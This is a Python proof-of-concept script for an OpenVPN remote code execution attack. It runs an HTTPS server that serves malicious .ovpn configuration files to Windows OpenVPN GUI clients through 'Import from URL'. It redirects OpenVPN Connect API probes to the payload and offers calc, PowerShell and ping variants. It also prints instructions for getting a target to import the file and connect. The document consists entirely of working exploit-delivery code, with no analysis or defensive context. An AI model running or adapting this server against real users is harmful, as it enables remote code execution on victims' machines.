#!/usr/bin/env python3
"""
OpenVPN RCE PoC - Web Server
Used for distributing malicious configuration files via URL

Usage:
1. Run on Windows: python poc_web_server.py
2. In Windows OpenVPN GUI: Import -> Import from URL
3. Enter: https://<ubuntu-ip>/vpn.ovpn
"""

import http.server
import ssl
import os
import subprocess
import sys
import socket

HTTPS_PORT = 443
CERT_DIR = os.path.join(".\\", "openvpn-poc")

def get_server_ip():
    """Get server IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"



class PoCHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        print(f"[*] {self.address_string()} - {args[0]}")

    def do_HEAD(self):
        self.do_GET(send_body=False)

    def do_GET(self, send_body=True):
        server_ip = get_server_ip()
        path = self.path
        
        # Handle OpenVPN Connect v3 API probes
        # They often append /openvpn-api/profile or similar to the URL
        if "/openvpn-api/" in path or "/rest/" in path:
            print(f"[*] Normalizing probe path: {path}")
            if "profile" in path or "GetUserlogin" in path:
                path = "/vpn.ovpn"
            else:
                self.send_response(200)
                self.end_headers()
                return

        payload_map = {
            "/": "calc",
            "/vpn.ovpn": "calc",
            "/calc.ovpn": "calc",
            "/cmd.ovpn": "calc", # Defaulting to calc for simplicity in RCE demo
            "/powershell.ovpn": "powershell",
            "/ping.ovpn": "ping"
        }

        # Normalize path if it starts with one of the keys (e.g., /vpn.ovpn/...)
        target_payload = None
        for p, name in payload_map.items():
            if p != "/" and path.startswith(p):
                target_payload = name
                break
        
        if not target_payload and path == "/":
            target_payload = "calc"

        if target_payload:
            print(f"[+] Sending malicious configuration ({target_payload}) to {self.address_string()}")

            filename = os.path.join(CERT_DIR, f"client_rce_{target_payload}.ovpn")
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    config = f.read()
            except FileNotFoundError:
                print(f"[!] Configuration file not found: {filename}")
                self.send_response(404)
                self.end_headers()
                return

            self.send_response(200)
            self.send_header("Content-Type", "application/x-openvpn-profile")
            self.send_header("Content-Disposition", f"attachment; filename=poc_{target_payload}.ovpn")
            self.send_header("Content-Length", len(config.encode()))
            self.end_headers()
            if send_body:
                self.wfile.write(config.encode())

        elif path == "/info":
            info = f"""
OpenVPN RCE PoC Web Server
==========================
Server IP: {server_ip}
VPN Port: 1194
Web Port: {HTTPS_PORT}

Available Configs:
  - Calc:       https://{server_ip}:{HTTPS_PORT}/calc.ovpn
  - CMD:        https://{server_ip}:{HTTPS_PORT}/cmd.ovpn
  - PowerShell: https://{server_ip}:{HTTPS_PORT}/powershell.ovpn
  - Ping:       https://{server_ip}:{HTTPS_PORT}/ping.ovpn
"""
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(info.encode())
        else:
            self.send_response(404)
            self.end_headers()

def main():
    server_ip = get_server_ip()

    print("=" * 50)
    print("OpenVPN RCE PoC - HTTPS Web Server")
    print("=" * 50)
    print(f"[*] Server IP: {server_ip}")
    print(f"[*] Web Port: {HTTPS_PORT} (HTTPS)")
    print(f"[*] VPN Port: 1194")
    print("")
    print("[*] Config URL:")
    print(f"    https://{server_ip}:{HTTPS_PORT}/vpn.ovpn")
    print("")
    print("[!] Ensure OpenVPN server is running:")
    print(f"    sudo openvpn --config ~/openvpn-poc/server.conf")
    print("")
    print("[*] In Windows OpenVPN GUI:")
    print(f"    1. Right-click tray icon -> Import -> Import from URL")
    print(f"    2. Enter: https://{server_ip}:{HTTPS_PORT}/vpn.ovpn")
    print(f"    3. Connect")
    print("=" * 50)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    try:
        context.load_cert_chain(f"{CERT_DIR}/web.crt", f"{CERT_DIR}/web.key")
    except FileNotFoundError as e:
        print(f"[!] SSL Certificate files do not exist: {e}")
        print("[!] Please run poc_generator.py to generate certificates first")
        sys.exit(1)

    with http.server.HTTPServer(("", HTTPS_PORT), PoCHandler) as httpd:
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        print(f"[*] HTTPS Web server started on port {HTTPS_PORT}...")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Server stopped")

if __name__ == "__main__":
    main()
